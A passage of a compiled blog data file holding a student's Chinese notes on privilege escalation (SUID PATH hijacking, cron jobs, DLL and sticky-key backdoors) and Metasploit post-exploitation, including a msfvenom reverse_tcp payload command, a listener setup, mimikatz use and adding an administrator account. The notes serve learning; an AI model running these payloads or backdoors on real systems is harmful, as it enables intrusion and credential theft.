19:57",stick:!1,keyword:"misc,ctfshow",description:"渗透测试",title:"渗透测试提权",tag:["渗透测试"],categories:["渗透测试","提权","歪比八卜"]},excerpt:"",headers:[{level:2,title:"提权篇",slug:"提权篇",children:[{level:3,title:"内核漏洞提权",slug:"内核漏洞提权",children:[]},{level:3,title:"Suid提权",slug:"suid提权",children:[]},{level:3,title:"GNU C library动态链接区$ORIGIN溢出提权",slug:"gnu-c-library动态链接区-origin溢出提权",children:[]},{level:3,title:"LINUX CRON JOBS提权",slug:"linux-cron-jobs提权",children:[]},{level:3,title:"Lpk提权",slug:"lpk提权",children:[]},{level:3,title:"zend nc提权",slug:"zend-nc提权",children:[]},{level:3,title:"Zend 反弹shell提权",slug:"zend-反弹shell提权",children:[]},{level:3,title:"Filezilla提权",slug:"filezilla提权",children:[]}]}],content:'\r\n\r\n\r\n## 提权篇\r\n\r\n一切一切一切的前提是你拿到了基础权限，能rce时\r\n\r\n### 内核漏洞提权\r\n\r\n [内核漏洞exp网](https://www.exploit-db.com/ )\r\n\r\n> 根据内核从网站上找对应的exp 在里面执行\r\n>\r\n> 当然，如果这个漏洞被修复过了，就再找一个，这类漏洞实战中比较少，属于高危漏洞\r\n\r\n### Suid提权 \r\n\r\n> 执行赋予4xxx的可执行文件\r\n\r\n> ![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757864.gif)\r\n>\r\n> Echo $PATH把当前tmp（777）目录增加到环境变量\r\n>\r\n> Export PATH=.:$PATH\r\n>\r\n> 设置了PATH执行cat的时候会优先从当前目录下查找程序。所以4xxx的可执行文件中的cat命令会被劫持，就会转到root用户\r\n>\r\n> 特定SUID参数利用，工具/手工探测后看参数是否被赋予SUID权限\r\n>\r\n> Nmap，Vim，find，Bash，More，Less，Nano，cp等系统命令 在suid可执行文件中使用就会发生劫持\r\n\r\n\r\n\r\n### GNU C library动态链接区$ORIGIN溢出提权\r\n\r\n> [**https://blog.csdn.net/qq_45555226/article/details/125686751**](https://blog.csdn.net/qq_45555226/article/details/125686751)\r\n>\r\n> **/proc/N/fd 包含进程相关的所有的文件描述符**\r\n>\r\n> **LDPRELOAD 在所有其他对象（附加的、用户指定、ELF 共享对象）之前加载，但实际上 LDPRELOAD 并非真的是首先加载，通过利用 LDAUDIT 环境变量可以实现优先于 LD_PRELOAD 加载。**\r\n>\r\n> **劫持预加载动态链接库 LD_AUDIT：**LD_AUDIT="\\$ORIGIN" exec /proc/self/fd/3\r\n>\r\n> 大概懂了但应该不怎么懂，和suid提权有一点像\r\n\r\n### LINUX CRON JOBS提权\r\n\r\n> 大概就是利用 /etc/crontab文件，可以设定系统定期执行的任务。\r\n>\r\n> 对于crontab的一些学习\r\n>\r\n> 首先 vi /etc/crontab添加定时执行任务（需要root权限）\r\n>\r\n> ![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757868.gif)\r\n>\r\n> 设定细节看链接https://blog.csdn.net/qq_41969358/article/details/87892343\r\n>\r\n> 注意python文件的文件格式\r\n>\r\n> ![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757870.gif)\r\n>\r\n> 如果用xftp传过去的话格式为doc 运行就会提示权限不够 所以需要修改fileformat=unix nnd找了好久\r\n>\r\n> 然后因为1.py是存在tmp（777）下的  达到提权\r\n>\r\n>  \r\n>\r\n> **![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757838.gif)**\r\n>\r\n> **给dash加上**\r\n>\r\n> **![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757863.gif)**\r\n>\r\n> 在普通用户下使用dash能做到在dash中提权\r\n>\r\n> Dash提权一般用于Ubuntu，主要Windows的定时系统\r\n\r\n### Lpk提权 \r\n\r\n> 仅用于Windows2003 和xp系统 \r\n\r\n> 在window2003或windowxp存在开机自启应用时,例如WebMail \r\n>\r\n> 且该目录中存在exe和lpk.dll时,每当重启电脑,或者电脑开机时,exe执行,调用了假的lpk.dll时就会被劫持。\r\n>\r\n> ![image-20230601191622884](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306011916067.png)T00ls Lpk Sethc v4生成lpk dll文件的工具，利用这个工具就可以生成后门文件劫持exe(作用是替换sethc（粘滞键))实现提权 \r\n>\r\n> 可以在该软件里自定义热键来唤醒,和密码来登录\r\n>\r\n> 远程链接 按 shirt 五次弹出 Sethc 窗口 同时按着 ctrl a 和 b 就会弹出后门输入密码 123456就能进去里\r\n\r\n### zend nc提权\r\n\r\n> 首先zend是服务器所使用的一个插件,在服务器重启的时候被调用\r\n>\r\n> iis6.0 在启动的时候 或 收回进程重启启动的时候有人访问网站的时候就会加载 dll 文件\r\n>\r\n> 提权方法:\r\n>\r\n> 首先利用Zend_DLL_Hijacking_for_nc.exe 生成相应dll文件,\r\n>\r\n> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306012022607.png" alt="image-20230601202221563" style="zoom:33%;" />\r\n>\r\n> 然后替换掉lib下的原dll文件,然后重启服务器,然后访问网站php网页\r\n>\r\n> 此时就能telnet远程登录服务器了 teletnt 192.168.0.115 4444\r\n>\r\n> 一般都是开防火墙的,可能这个不太行,所以一般只是在反弹shell不能用的情况下碰碰运气用的\r\n\r\n### Zend 反弹shell提权\r\n\r\n> 原理和前面的差不多\r\n>\r\n> 利用msf文件生成反弹程序（msf见[kali msfconsole命令详解以及靶机攻破实战](https://zhuanlan.zhihu.com/p/604440914)） 然后上传至目标主机服务器内 利用zend工具将dll文件进行生成 并将原dll文件替换 并在kali攻击机上设置监听 当目标服务器有人进行php网站访问时就会被捕获 从而提权\r\n\r\n### Filezilla提权\r\n\r\n> 原理是利用lck端口转发工具 利用filezilla多端口远程登录 达到可以修改filezilla共享的文件夹内的文件 配合其他手段达到提权 下文就是利用cmd.exe替换sethe.exe来达到替换粘滞键提权\r\n>\r\n> 具体实施过程：\r\n>\r\n> 利用lck端口转发filezilla的14147端口至14148 然后在攻击机上用14148端口登录filezilla 从而修改登录用户或者修改所共享的目录 然后更改目录中C:\\WINDOWS\\system32 中的sethc.exe（粘滞）修改为cmd进行污染\r\n\r\n>看教程说是粘滞键的一般是sethc.exe,但是此次实验中有多个不一样的，遇到这种问题，那就开了粘滞键看进程是哪一个在执行，替换掉就行了\r\n\r\n> ![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757882.gif)\r\n>\r\n> ![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757662.gif)\r\n>\r\n> 不懂',contentRendered:'<h2 id="提权篇" tabindex="-1"><a class="header-anchor" href="#提权篇" aria-hidden="true">#</a> 提权篇</h2>\n<p>一切一切一切的前提是你拿到了基础权限，能rce时</p>\n<h3 id="内核漏洞提权" tabindex="-1"><a class="header-anchor" href="#内核漏洞提权" aria-hidden="true">#</a> 内核漏洞提权</h3>\n<p><a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreferrer">内核漏洞exp网<ExternalLinkIcon/></a></p>\n<blockquote>\n<p>根据内核从网站上找对应的exp 在里面执行</p>\n<p>当然，如果这个漏洞被修复过了，就再找一个，这类漏洞实战中比较少，属于高危漏洞</p>\n</blockquote>\n<h3 id="suid提权" tabindex="-1"><a class="header-anchor" href="#suid提权" aria-hidden="true">#</a> Suid提权</h3>\n<blockquote>\n<p>执行赋予4xxx的可执行文件</p>\n</blockquote>\n<blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757864.gif" data="aurora"></p>\n<p>Echo $PATH把当前tmp（777）目录增加到环境变量</p>\n<p>Export PATH=.:$PATH</p>\n<p>设置了PATH执行cat的时候会优先从当前目录下查找程序。所以4xxx的可执行文件中的cat命令会被劫持，就会转到root用户</p>\n<p>特定SUID参数利用，工具/手工探测后看参数是否被赋予SUID权限</p>\n<p>Nmap，Vim，find，Bash，More，Less，Nano，cp等系统命令 在suid可执行文件中使用就会发生劫持</p>\n</blockquote>\n<h3 id="gnu-c-library动态链接区-origin溢出提权" tabindex="-1"><a class="header-anchor" href="#gnu-c-library动态链接区-origin溢出提权" aria-hidden="true">#</a> GNU C library动态链接区$ORIGIN溢出提权</h3>\n<blockquote>\n<p><a href="https://blog.csdn.net/qq_45555226/article/details/125686751" target="_blank" rel="noopener noreferrer"><strong>https://blog.csdn.net/qq_45555226/article/details/125686751</strong><ExternalLinkIcon/></a></p>\n<p><strong>/proc/N/fd 包含进程相关的所有的文件描述符</strong></p>\n<p><strong>LDPRELOAD 在所有其他对象（附加的、用户指定、ELF 共享对象）之前加载，但实际上 LDPRELOAD 并非真的是首先加载，通过利用 LDAUDIT 环境变量可以实现优先于 LD_PRELOAD 加载。</strong></p>\n<p>**劫持预加载动态链接库 LD_AUDIT：**LD_AUDIT=&quot;$ORIGIN&quot; exec /proc/self/fd/3</p>\n<p>大概懂了但应该不怎么懂，和suid提权有一点像</p>\n</blockquote>\n<h3 id="linux-cron-jobs提权" tabindex="-1"><a class="header-anchor" href="#linux-cron-jobs提权" aria-hidden="true">#</a> LINUX CRON JOBS提权</h3>\n<blockquote>\n<p>大概就是利用 /etc/crontab文件，可以设定系统定期执行的任务。</p>\n<p>对于crontab的一些学习</p>\n<p>首先 vi /etc/crontab添加定时执行任务（需要root权限）</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757868.gif" data="aurora"></p>\n<p>设定细节看链接https://blog.csdn.net/qq_41969358/article/details/87892343</p>\n<p>注意python文件的文件格式</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757870.gif" data="aurora"></p>\n<p>如果用xftp传过去的话格式为doc 运行就会提示权限不够 所以需要修改fileformat=unix nnd找了好久</p>\n<p>然后因为1.py是存在tmp（777）下的  达到提权</p>\n<p><strong><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757838.gif" data="aurora"></strong></p>\n<p><strong>给dash加上</strong></p>\n<p><strong><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757863.gif" data="aurora"></strong></p>\n<p>在普通用户下使用dash能做到在dash中提权</p>\n<p>Dash提权一般用于Ubuntu，主要Windows的定时系统</p>\n</blockquote>\n<h3 id="lpk提权" tabindex="-1"><a class="header-anchor" href="#lpk提权" aria-hidden="true">#</a> Lpk提权</h3>\n<blockquote>\n<p>仅用于Windows2003 和xp系统</p>\n</blockquote>\n<blockquote>\n<p>在window2003或windowxp存在开机自启应用时,例如WebMail</p>\n<p>且该目录中存在exe和lpk.dll时,每当重启电脑,或者电脑开机时,exe执行,调用了假的lpk.dll时就会被劫持。</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230601191622884" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306011916067.png" data="aurora">T00ls Lpk Sethc v4生成lpk dll文件的工具，利用这个工具就可以生成后门文件劫持exe(作用是替换sethc（粘滞键))实现提权</p>\n<p>可以在该软件里自定义热键来唤醒,和密码来登录</p>\n<p>远程链接 按 shirt 五次弹出 Sethc 窗口 同时按着 ctrl a 和 b 就会弹出后门输入密码 123456就能进去里</p>\n</blockquote>\n<h3 id="zend-nc提权" tabindex="-1"><a class="header-anchor" href="#zend-nc提权" aria-hidden="true">#</a> zend nc提权</h3>\n<blockquote>\n<p>首先zend是服务器所使用的一个插件,在服务器重启的时候被调用</p>\n<p>iis6.0 在启动的时候 或 收回进程重启启动的时候有人访问网站的时候就会加载 dll 文件</p>\n<p>提权方法:</p>\n<p>首先利用Zend_DLL_Hijacking_for_nc.exe 生成相应dll文件,</p>\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306012022607.png" alt="image-20230601202221563" style="zoom:33%;" />\n<p>然后替换掉lib下的原dll文件,然后重启服务器,然后访问网站php网页</p>\n<p>此时就能telnet远程登录服务器了 teletnt 192.168.0.115 4444</p>\n<p>一般都是开防火墙的,可能这个不太行,所以一般只是在反弹shell不能用的情况下碰碰运气用的</p>\n</blockquote>\n<h3 id="zend-反弹shell提权" tabindex="-1"><a class="header-anchor" href="#zend-反弹shell提权" aria-hidden="true">#</a> Zend 反弹shell提权</h3>\n<blockquote>\n<p>原理和前面的差不多</p>\n<p>利用msf文件生成反弹程序（msf见<a href="https://zhuanlan.zhihu.com/p/604440914" target="_blank" rel="noopener noreferrer">kali msfconsole命令详解以及靶机攻破实战<ExternalLinkIcon/></a>） 然后上传至目标主机服务器内 利用zend工具将dll文件进行生成 并将原dll文件替换 并在kali攻击机上设置监听 当目标服务器有人进行php网站访问时就会被捕获 从而提权</p>\n</blockquote>\n<h3 id="filezilla提权" tabindex="-1"><a class="header-anchor" href="#filezilla提权" aria-hidden="true">#</a> Filezilla提权</h3>\n<blockquote>\n<p>原理是利用lck端口转发工具 利用filezilla多端口远程登录 达到可以修改filezilla共享的文件夹内的文件 配合其他手段达到提权 下文就是利用cmd.exe替换sethe.exe来达到替换粘滞键提权</p>\n<p>具体实施过程：</p>\n<p>利用lck端口转发filezilla的14147端口至14148 然后在攻击机上用14148端口登录filezilla 从而修改登录用户或者修改所共享的目录 然后更改目录中C:\\WINDOWS\\system32 中的sethc.exe（粘滞）修改为cmd进行污染</p>\n</blockquote>\n<blockquote>\n<p>看教程说是粘滞键的一般是sethc.exe,但是此次实验中有多个不一样的，遇到这种问题，那就开了粘滞键看进程是哪一个在执行，替换掉就行了</p>\n</blockquote>\n<blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757882.gif" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757662.gif" data="aurora"></p>\n<p>不懂</p>\n</blockquote>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/penetration/",pathLocale:"/",permalink:null,routeMeta:{},slug:"README",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/penetration/README.md",filePathRelative:"penetration/README.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/penetration/index.html.vue",componentFilePathRelative:"pages/penetration/index.html.vue",componentFileChunkName:"v-02eb67bd",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/penetration/index.html.js",dataFilePathRelative:"pages/penetration/index.html.js",dataFileChunkName:"v-02eb67bd",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/penetration/index.html",htmlFilePathRelative:"penetration/index.html"},{data:{key:"v-ab2961b0",path:"/readme/",title:"写在建站之初",lang:"zh-CN",frontmatter:{date:"2023/5/19 16:49",stick:!1,keyword:"建站,建站",description:"没啥好描述的",title:"写在建站之初",tag:["first"],categories:["稀里糊涂","歪比八卜"]},excerpt:"",headers:[],git:{}},key:"v-ab2961b0",path:"/readme/",title:"写在建站之初",lang:"zh-CN",frontmatter:{date:"2023/5/19 16:49",stick:!1,keyword:"建站,建站",description:"没啥好描述的",title:"写在建站之初",tag:["first"],categories:["稀里糊涂","歪比八卜"]},excerpt:"",headers:[],content:"\n\n\n# 写在建站之初的一些话\n\n>写这个博客希望督促自己能抓紧剩下的几年大学时间多去学习新知识了\n>\n>总感觉落下太多了\n>\n>慢慢写，慢慢更\n>\n>加油！！！！！\n>\n>页面用了这个主题[Aurora](https://www.npmjs.com/package/vuepress-theme-aurora)小推\n\n",contentRendered:'<h1 id="写在建站之初的一些话" tabindex="-1"><a class="header-anchor" href="#写在建站之初的一些话" aria-hidden="true">#</a> 写在建站之初的一些话</h1>\n<blockquote>\n<p>写这个博客希望督促自己能抓紧剩下的几年大学时间多去学习新知识了</p>\n<p>总感觉落下太多了</p>\n<p>慢慢写，慢慢更</p>\n<p>加油！！！！！</p>\n<p>页面用了这个主题<a href="https://www.npmjs.com/package/vuepress-theme-aurora" target="_blank" rel="noopener noreferrer">Aurora<ExternalLinkIcon/></a>小推</p>\n</blockquote>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/readme/",pathLocale:"/",permalink:null,routeMeta:{},slug:"README",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/readme/README.md",filePathRelative:"readme/README.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/readme/index.html.vue",componentFilePathRelative:"pages/readme/index.html.vue",componentFileChunkName:"v-ab2961b0",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/readme/index.html.js",dataFilePathRelative:"pages/readme/index.html.js",dataFileChunkName:"v-ab2961b0",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/readme/index.html",htmlFilePathRelative:"readme/index.html"},{data:{key:"v-811949f4",path:"/tool/1.html",title:"相关工具使用（未整理版）",lang:"zh-CN",frontmatter:{date:"2023/7/5 19:57",stick:!1,keyword:"misc,ctfshow",description:null,title:"相关工具使用（未整理版）",tag:["相关工具使用"],categories:["渗透测试","misc","web"]},excerpt:"",headers:[{level:2,title:"反弹加提权的一般步骤",slug:"反弹加提权的一般步骤",children:[]},{level:2,title:"后渗透",slug:"后渗透",children:[{level:3,title:"模块利用",slug:"模块利用",children:[]},{level:3,title:"cmd命令",slug:"cmd命令",children:[]}]},{level:2,title:"文件格式",slug:"文件格式",children:[{level:3,title:"文件头和文件尾",slug:"文件头和文件尾",children:[]}]}],git:{}},key:"v-811949f4",path:"/tool/1.html",title:"相关工具使用（未整理版）",lang:"zh-CN",frontmatter:{date:"2023/7/5 19:57",stick:!1,keyword:"misc,ctfshow",description:null,title:"相关工具使用（未整理版）",tag:["相关工具使用"],categories:["渗透测试","misc","web"]},excerpt:"",headers:[{level:2,title:"反弹加提权的一般步骤",slug:"反弹加提权的一般步骤",children:[]},{level:2,title:"后渗透",slug:"后渗透",children:[{level:3,title:"模块利用",slug:"模块利用",children:[]},{level:3,title:"cmd命令",slug:"cmd命令",children:[]}]},{level:2,title:"文件格式",slug:"文件格式",children:[{level:3,title:"文件头和文件尾",slug:"文件头和文件尾",children:[]}]}],content:"\r\n \r\n\r\n# Audacity\r\n\r\n音频处理软件，常用于查看音频隐写，类似摩斯密码等\r\n\r\n首先打开文件，然后观察是否有多个音轨，然后观察音轨中是否有摩斯密码等相关的信息（长短）\r\n\r\n![image-20230724144117152](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241441432.png)\r\n\r\n然后对照这翻译\r\n\r\n![image-20230724144501063](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241445142.png)\r\n\r\n# msf的使用\r\n\r\n```\r\nKali中MSF中session相关命令：\r\n\r\nsessions    –h 查看帮助\r\nsessions \t-i <ID值>  #进入会话  \r\n\r\n \t\t\t-k  杀死会话\t\r\nbackground  #将当前会话放置后台\r\nrun  \t\t#执行已有的模块，输入run后按两下tab，列出已有的脚本\r\ninfo\t    #查看已有模块信息\r\ngetuid \t\t#查看权限 \r\ngetpid \t\t#获取当前进程的pid\r\nsysinfo \t#查看目标机系统信息\r\nps \t\t\t#查看当前活跃进程   \r\n\r\nkill \t\t#<PID值> 杀死进程\r\nidletime \t#查看目标机闲置时间\r\nreboot\t\t#重启\r\nshutdown   \t#关机\r\nshell \t\t#进入目标机CMD窗口\r\n```\r\n\r\n## 反弹加提权的一般步骤\r\n\r\n首先先用msfvenom生成攻击载荷\r\n\r\n`msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.109 lport=12345 -f exe >s.exe`\r\n\r\n上传载荷致服务器端，要选一个可以执行的目录文件，用wt.asp先扫一遍目录先看看\r\n\r\n然后拿ASPXSpy2014.aspx（admin）执行文件\r\n\r\n![image-20230726111408035](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261114178.png)\r\n\r\n在此之前先开启监听\r\n\r\n`msfconsole`\r\n\r\n`use exploit/multi/handler`\r\n\r\n`set payload windows/meterpreter/reverse_tcp`\r\n\r\n`set lhost 192.168.x.x`\r\n\r\n`set lport xx ()随便空端口号就行)`\r\n\r\n`run`\r\n\r\n![image-20230724145454737](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261512384.png)\r\n\r\n等待上线\r\n\r\n上线以后检测提权的漏洞 \r\n\r\n`use post/multi/recon/local_exploit_suggester`\r\n\r\n`set session 1`\r\n\r\n`run`\r\n\r\n有可能会提示检测中途断开，更新一下msf\r\n\r\n看一下能用的漏洞模块\r\n\r\n![image-20230725220840944](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261512838.png)\r\n\r\n利用一下，提权完毕\r\n\r\n![image-20230725221029006](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261509599.png)\r\n\r\n## 后渗透\r\n\r\n后渗透就感觉很刑了\r\n\r\n多个方法玩转主机\r\n\r\nhelp查看能用的功能 但是呢这种英文版肯定是不适合我这种废物的\r\n\r\n所以呢肯定得搞一个中文版看看[(Meterpreter命令详解）](https://blog.csdn.net/weixin_45605352/article/details/115824811)\r\n\r\n![image-20230726153009757](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261530835.png)\r\n\r\n要是进了shell发现奇奇怪怪的玄学问题那也只好全部关掉重新抓个进去用了\r\n\r\nmeterpreter 是可以加载很多模块进行利用的\r\n\r\n### 模块利用\r\n\r\n我是先学了**kiwi**模块\r\n\r\n这个首先得load kiwi加载模块\r\n\r\n其次得关注一下系统的架构 64x的要把进程迁到64x进程中 kiwi默认实现32x的\r\n\r\nsysinfo看系统信息\r\n\r\nps看进程 \r\n\r\nmigrate [PID]换进程\r\n\r\n具体可以参考[MSF中kiwi(mimikatz)模块的使用](https://blog.csdn.net/weixin_45588247/article/details/119497964)\r\n\r\n这个是shell中主机操作 [后渗透主机操作_渗透后控制主机_](https://chenchena.blog.csdn.net/article/details/124493550)用来关关防火墙，远控桌面\r\n\r\n### cmd命令\r\n\r\n补一条拿了管理员权限增加用户命令\r\n\r\nnet user [name] [paaswd] /add #增加用户\r\n\r\nnet localgroup #查看计算机本地组用户，看一下什么是有管理员权限的\r\n\r\nnet user [name]# 用于查看用户的相关信息，可以看用户组的改变\r\n\r\nnet localgroup Adminstrators(组) [name] /add\r\n\r\n\r\n\r\n## 文件格式\r\n\r\n### 文件头和文件尾\r\n\r\n```\r\nJPEG (jpg)，             　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　\r\nPNG (png)，            　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82\r\nGIF (gif)，              　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                 ZIP Archive (zip)，           文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4B\r\n\r\nTIFF (tif)，              　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：\r\nWindows Bitmap (bmp)，      文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：\r\nCAD (dwg)，               文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：\r\nAdobe Photoshop (psd)，      文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：\r\nRich Text Format (rtf)，       文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：\r\nXML (xml)，                文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：\r\nHTML (html)，              文件头：68746D6C3E\r\nEmail [thorough only] (eml)，   文件头：44656C69766572792D646174653A\r\nOutlook Express (dbx)，       文件头：CFAD12FEC5FD746F\r\nOutlook (pst)，             文件头：2142444E\r\nMS Word/Excel (xls.or.doc)，    文件头：D0CF11E0\r\nMS Access (mdb)，           文件头：5374616E64617264204A\r\nWordPerfect (wpd)，          文件头：FF575043\r\nAdobe Acrobat (pdf)，        文件头：255044462D312E\r\nQuicken (qdf)，             文件头：AC9EBD8F\r\nWindows Password (pwl)，     文件头：E3828596\r\n\r\nRAR Archive (rar)，           文件头：52617221\r\nWave (wav)，               文件头：57415645\r\nAVI (avi)，                 文件头：41564920\r\nReal Audio (ram)，           文件头：2E7261FD\r\nReal Media (rm)，            文件头：2E524D46\r\nMPEG (mpg)，              文件头：000001BA\r\nMPEG (mpg)，              文件头：000001B3\r\nQuicktime (mov)，           文件头：6D6F6F76\r\nWindows Media (asf)，        文件头：3026B2758E66CF11\r\nMIDI (mid)，                文件头：4D546864\r\n```\r\n\r\n",contentRendered:'<h1 id="audacity" tabindex="-1"><a class="header-anchor" href="#audacity" aria-hidden="true">#</a> Audacity</h1>\n<p>音频处理软件，常用于查看音频隐写，类似摩斯密码等</p>\n<p>首先打开文件，然后观察是否有多个音轨，然后观察音轨中是否有摩斯密码等相关的信息（长短）</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724144117152" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241441432.png" data="aurora"></p>\n<p>然后对照这翻译</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724144501063" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241445142.png" data="aurora"></p>\n<h1 id="msf的使用" tabindex="-1"><a class="header-anchor" href="#msf的使用" aria-hidden="true">#</a> msf的使用</h1>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>Kali中MSF中session相关命令：\n\nsessions    –h 查看帮助\nsessions \t-i &lt;ID值>  #进入会话  \n\n \t\t\t-k  杀死会话\t\nbackground  #将当前会话放置后台\nrun  \t\t#执行已有的模块，输入run后按两下tab，列出已有的脚本\ninfo\t    #查看已有模块信息\ngetuid \t\t#查看权限 \ngetpid \t\t#获取当前进程的pid\nsysinfo \t#查看目标机系统信息\nps \t\t\t#查看当前活跃进程   \n\nkill \t\t#&lt;PID值> 杀死进程\nidletime \t#查看目标机闲置时间\nreboot\t\t#重启\nshutdown   \t#关机\nshell \t\t#进入目标机CMD窗口\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h2 id="反弹加提权的一般步骤" tabindex="-1"><a class="header-anchor" href="#反弹加提权的一般步骤" aria-hidden="true">#</a> 反弹加提权的一般步骤</h2>\n<p>首先先用msfvenom生成攻击载荷</p>\n<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.109 lport=12345 -f exe &gt;s.exe</code></p>\n<p>上传载荷致服务器端，要选一个可以执行的目录文件，用wt.asp先扫一遍目录先看看</p>\n<p>然后拿ASPXSpy2014.aspx（admin）执行文件</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230726111408035" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261114178.png" data="aurora"></p>\n<p>在此之前先开启监听</p>\n<p><code>msfconsole</code></p>\n<p><code>use exploit/multi/handler</code></p>\n<p><code>set payload windows/meterpreter/reverse_tcp</code></p>\n<p><code>set lhost 192.168.x.x</code></p>\n<p><code>set lport xx ()随便空端口号就行)</code></p>\n<p><code>run</code></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724145454737" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261512384.png" data="aurora"></p>\n<p>等待上线</p>\n<p>上线以后检测提权的漏洞</p>\n<p><code>use post/multi/recon/local_exploit_suggester</code></p>\n<p><code>set session 1</code></p>\n<p><code>run</code></p>\n<p>有可能会提示检测中途断开，更新一下msf</p>\n<p>看一下能用的漏洞模块</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725220840944" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261512838.png" data="aurora"></p>\n<p>利用一下，提权完毕</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725221029006" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261509599.png" data="aurora"></p>\n<h2 id="后渗透" tabindex="-1"><a class="header-anchor" href="#后渗透" aria-hidden="true">#</a> 后渗透</h2>\n<p>后渗透就感觉很刑了</p>\n<p>多个方法玩转主机</p>\n<p>help查看能用的功能 但是呢这种英文版肯定是不适合我这种废物的</p>\n<p>所以呢肯定得搞一个中文版看看<a href="https://blog.csdn.net/weixin_45605352/article/details/115824811" target="_blank" rel="noopener noreferrer">(Meterpreter命令详解）<ExternalLinkIcon/></a></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230726153009757" 